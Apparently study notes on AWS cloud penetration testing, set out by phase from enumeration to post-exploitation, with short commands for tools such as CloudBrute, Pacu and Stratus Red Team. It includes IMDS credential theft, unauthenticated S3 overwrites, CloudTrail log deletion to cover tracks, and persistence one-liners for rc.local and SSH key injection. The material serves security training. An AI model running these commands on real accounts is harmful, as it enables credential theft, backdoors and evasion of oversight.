## 1. Enumeration & Information Gathering

### Enumerating S3 Buckets
Attackers look for misconfigured buckets to modify files or inject malware.
*   **Google Dorks:** `inurl: s3.amazonaws.com`, `site:s3.amazonaws.com inurl:facebook`
*   **CloudBrute:** Enumerates S3 buckets by brute-forcing names using wordlists.
    *   `./cloudbrute -d amazon.com -k facebook -t 80 -T 10 -w /bucket_list.txt`
*   **S3Scanner:** Identifies open buckets and retrieves objects/ACL info.
    *   `s3scanner -bucket-file names.txt -enumerate -threads 8`
*   **BucketLoot:** Checks permissions and extracts URLs/subdomains.
    *   List public buckets: `python bucketloot.py -l accounts.txt`
    *   Check permissions: `python bucketloot.py -c accounts.txt`
*   **DumpsterDiver:** Scans hardcoded secrets (AWS keys, SSL keys) based on regex (e.g., AKIA...).
    *   `dumpsterDiver -p /path/to/scan -e AWS_KEY`

### Enumerating Open Ports & EC2 Instances
*   **Masscan:** Fast port scanner to find exposed services (e.g., SSH, HTTP, MySQL).
    *   `sudo masscan -p0-65535 <target_IP> --rate=1000 -oJ scan_results.json`
*   **AWS CLI Enumeration:**
    *   List instances: `aws ec2 describe-instances`
    *   Get user data (secrets): `aws ec2 describe-instance-attribute --instance-id <id> --attribute userData --query "UserData.Value" | base64 --decode`
    *   List Security Groups: `aws ec2 describe-security-groups`
    *   List IAM profile associations: `aws ec2 describe-iam-instance-profile-associations`

### Enumerating RDS Instances & Serverless Resources
*   **RDS:** `aws rds describe-db-instances`, `aws rds describe-db-snapshots`
*   **Lambda:** `aws lambda list-functions`, `aws lambda get-function-configuration`
*   **DynamoDB:** `aws dynamodb list-tables`, `aws dynamodb list-global-tables`
*   **API Gateway:** `aws apigateway get-rest-apis`

### Enumerating IAM Roles & AWS Cognito
*   **Cloudsplaining:** Analyzes IAM policies for excessive permissions.
    *   `aws iam get-account-authorization-details --output json > auth.json`
    *   `cloudsplaining scan --input-file auth.json --output ./report`
*   **Principal Mapper (PMapper):** Visualizes IAM roles/users in a directional graph to find privilege escalation paths.
*   **AWS Cognito:** Enumerates user pools and identity pools to target apps.
    *   `aws cognito-idp list-user-pools`
    *   `aws cognito-identity list-identity-pools`

### Enumerating DNS Records
*   **Ghostbuster:** Pulls subdomain records from Route 53 and Cloudflare to find potential takeovers.
    *   `ghostbuster scan aws --profile <profile_name>`

## 2. Discovering Attack Paths

*   **Prowler:** Comprehensive vulnerability scanner covering CIS, NIST, and HIPAA standards.
    *   `prowler aws --profile custom-profile --filter-region us-east-1 -M html`
*   **CloudSploit:** Identifies misconfigurations (exposed buckets, overly permissive IAM).
    *   `./index.js --console=text`
*   **Cartography (Neo4j):** Maps security posture into a graph view to find relationships.
    *   *Example Cypher Query (Find exposed EC2):* `MATCH (instance:EC2Instance{exposed_internet: true}) RETURN instance.instanceid`
*   **CloudFox:** Automated enumeration for exploitable attack paths (finds secrets in userdata, env vars, role trusts).
    *   `cloudfox aws --profile <name> all-checks`

## 3. AWS Threat Emulation

*   **Stratus Red Team:** "Atomic Red Team" for the cloud. Emulates offensive techniques mapped to MITRE ATT&CK.
    *   List techniques: `stratus list --platform AWS --mitre-attack-tactic persistence`
    *   Warmup/Detonate: `stratus warmup <Attack technique>` / `stratus detonate <Attack technique>`

## 4. Exploitation & Access

*   **IMDS Attack (Instance Metadata Service):** Exploiting SSRF or reverse proxy to query the IMDS endpoint (`169.254.169.254`) and retrieve AWS cloud keys.
    *   `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<Role-Name>`
    *   *Countermeasure:* Use IMDSv2 (requires session tokens).
*   **Exploiting Misconfigured S3 Buckets:**
    *   Check access: `aws s3 ls s3://[bucket_name] --no-sign-request`
    *   Upload/Overwrite files: `aws s3 cp test.svg s3://[bucket_name]/test.svg --no-sign-request`
*   **Compromising IAM Credentials:**
    *   *Repository Misconfig:* Finding `.gitignore` or `.env` files on GitHub with hardcoded keys.
    *   *Social Engineering:* Phishing emails alerting users to "AWS Budget exceeded".
    *   *SSRF:* Reading `/etc/passwd` or extracting credentials from metadata.
    *   *Local Files:* Stealing `~/.aws/credentials` from a compromised host.

## 5. Privilege Escalation & Backdoors

*   **Elevating Access:** Abusing `iam:CreatePolicyVersion` or `iam:SetDefaultPolicyVersion` to grant admin rights.
*   **Passing Roles:** Using `iam:PassRole` and `ec2:RunInstances` to create an EC2 instance with a privileged role, logging into it, and extracting the metadata credentials.
*   **Creating Backdoor Accounts (Pacu / Endgame):**
    *   **Pacu:** Exploits misconfigured IAM policies (e.g., `assume_role_enum.py` to auto-assume roles).
    *   **Endgame:** Exposes resources (S3, ECR, Lambda, RDS) by creating backdoors (rogue accounts).
        *   `endgame expose --service iam --name test-resource-exposure`

## 6. Post-Exploitation & Maintaining Access

*   **Manipulating CloudTrail (Covering Tracks):**
    *   Stop logging: `aws CloudTrail stop-logging --name targetcloud_trail`
    *   Delete trails: `aws CloudTrail delete-trail --name targetcloud_trail`
*   **Establishing Persistence on EC2:**
    *   Create backdoor IAM users (`aws iam create-user`).
    *   Alter Startup Scripts (`echo "malicious.sh" >> /etc/rc.local`).
    *   SSH Key Injection (`echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys`).
    *   Install Rootkits to hide processes.
*   **Lateral Movement (Cross-Account/Region):**
    *   Assume roles in other accounts: `aws sts assume-role --role-arn arn:aws:iam::<id>:role/<name> --role-session-name test`
    *   Discover regions: `aws ec2 describe-regions`
    *   List resources in new regions: `aws s3api list-buckets`

## 7. AWSGoat Scenarios

AWSGoat is a vulnerable-by-design infrastructure for practicing exploits.
*   **Server-Side Request Forgery (SSRF):** Exploiting a file upload/URL request feature to fetch cloud metadata credentials or `/etc/passwd`.
*   **IAM Privilege Escalation:** Using a low-privileged account to attach an `AdministratorAccess` policy to oneself.
*   **File Upload and Task Metadata:** Uploading a reverse shell (e.g., `php-reverse-shell.php`) to execute arbitrary code and retrieve metadata.
